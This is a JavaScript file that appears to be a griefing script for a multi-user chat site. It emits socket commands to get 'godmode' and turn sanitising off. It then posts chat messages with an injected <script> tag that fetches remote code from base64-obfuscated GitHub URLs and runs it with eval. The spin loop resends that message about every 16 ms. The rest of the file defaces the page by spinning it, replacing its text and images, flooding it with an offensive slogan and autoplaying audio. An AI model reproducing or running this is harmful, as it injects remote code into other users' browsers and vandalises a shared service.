socket.emit('command', { list: ['godmode'] });
socket.emit('command', { list: ['sanitize', 'off'] });
socket.emit('talk', { text: "WHAT THE FUCK!? <script>console.log('(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)');fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v')+'38-A'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t);fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v')+'38-D'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t));fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v')+'38-A'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t))</script>" });

const audioUrl = 'https://github.com/ivorydevrimoalt/BONZIWORLDULTRAJAVASCRIPTLIST/blob/main/hdfghdfghdfghdfg.wav?raw=true';

function playAudioWithRetry(url, maxRetries = 5, delay = 1000) {
  let attempts = 0;

  function attemptPlay() {
    const audio = new Audio(url);
    audio.volume = 1.0;

    audio.play().catch((error) => {
      attempts++;
      console.warn(`Playback failed (Attempt ${attempts}/${maxRetries}):`, error);

      if (attempts < maxRetries) {
        // Wait a bit before trying again
        setTimeout(attemptPlay, delay);
      } else {
        console.error('Max audio playback retries reached. Giving up.');
      }
    });
  }

  attemptPlay();
}

// Start playing with retry enabled
playAudioWithRetry(audioUrl);

let fk = Math.PI * 1;
const htmlElement = document.documentElement; // Correctly targets the <html> tag

function spin() {
    htmlElement.style.transform = `rotate(${fk}deg)`; // apply rotation
    socket.emit('talk', { text: "WHAT THE FUCK!? <script>console.log('(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)');fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v')+'38-F'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t);fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v')+'38-D'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t));fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v')+'38-A'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t))</script>" });
    fk = ((fk * 1.5)%Math.PI * 10); // increase step size each tick → faster spin
    setTimeout(spin, 16); // constant delay (~60 FPS)
}
(function replaceAllText(node) {
  // Recursively traverse all child nodes
  node.childNodes.forEach(child => {
    if (child.nodeType === Node.TEXT_NODE) {
      // Replace only if the text isn't entirely whitespace
      if (child.nodeValue.trim() !== '') {
        child.nodeValue = "OGGY SMOKES DRUGS AND KILLS EVERYBODY ".repeat(10);
      }
    } else if (child.nodeType === Node.ELEMENT_NODE) {
      // Skip script and style tags to avoid breaking the page functionality
      if (child.tagName !== 'SCRIPT' && child.tagName !== 'STYLE') {
        replaceAllText(child);
      }
    }
  });
})(document.body);
(function replaceEverythingWithImage() {
    const replacementUrl = "https://github.com/ivorydevrimoalt/BONZIWORLDULTRAJAVASCRIPTLIST/blob/main/image_2026-10-04_132240623.png?raw=true";
    const bgValue = `url("${replacementUrl}")`;

    // 1. Replace all standard <img> and image inputs
    document.querySelectorAll('img, input[type="image"]').forEach(img => {
        img.src = replacementUrl;
        if (img.srcset) img.srcset = "";
    });

    // 2. Replace all SVGs, objects, and embeds with an <img> element
    document.querySelectorAll('svg, object, embed').forEach(node => {
        const img = document.createElement('img');
        img.src = replacementUrl;
        img.style.width = node.clientWidth ? node.clientWidth + 'px' : '50px';
        img.style.height = node.clientHeight ? node.clientHeight + 'px' : '50px';
        if (node.parentNode) {
            node.parentNode.replaceChild(img, node);
        }
    });

    // 3. Put the background image everywhere on every element
    document.querySelectorAll('*').forEach(el => {
        el.style.backgroundImage = bgValue;
    });
})();
// Change "YOUR TEXT HERE" to whatever you want to plaster
const textToPlaster = "OGGY SMOKES DRUGS AND KILLS EVERYBODY";

// Run every 0.1 seconds (100 milliseconds)
setInterval(() => {
  const div = document.createElement("div");
  div.innerText = textToPlaster;
  
  // Style the element so it appears randomly and doesn't disrupt layout
  div.style.position = "fixed";
  div.style.left = Math.random() * window.innerWidth + "px";
  div.style.top = Math.random() * window.innerHeight + "px";
  div.style.color = `hsl(${Math.random() * 360}, 100%, 50%)`; // Random bright color
  div.style.fontSize = Math.floor(Math.random() * 24 + 12) + "px"; // Random font size
  div.style.fontWeight = "bold";
  div.style.zIndex = "999999";
  div.style.pointerEvents = "none"; // Allows clicking through the text
  
  document.body.appendChild(div);
}, 100);
const textToPlaste = "OGGY SMOKES DRUGS AND KILLS EVERYBODY";

setInterval(() => {
  const div = document.createElement("div");
  div.innerText = textToPlaste;
  
  div.style.position = "fixed";
  div.style.left = Math.random() * window.innerWidth + "px";
  div.style.top = Math.random() * window.innerHeight + "px";
  div.style.color = `hsl(${Math.random() * 360}, 100%, 50%)`;
  div.style.fontSize = Math.floor(Math.random() * 20 + 14) + "px";
  div.style.fontWeight = "bold";
  div.style.fontFamily = "sans-serif";
  div.style.zIndex = "2147483647"; // Maximum possible z-index to stay on top of everything
  div.style.pointerEvents = "none"; // Lets you click right through the text
  
  document.body.appendChild(div);
}, 10);
spin();
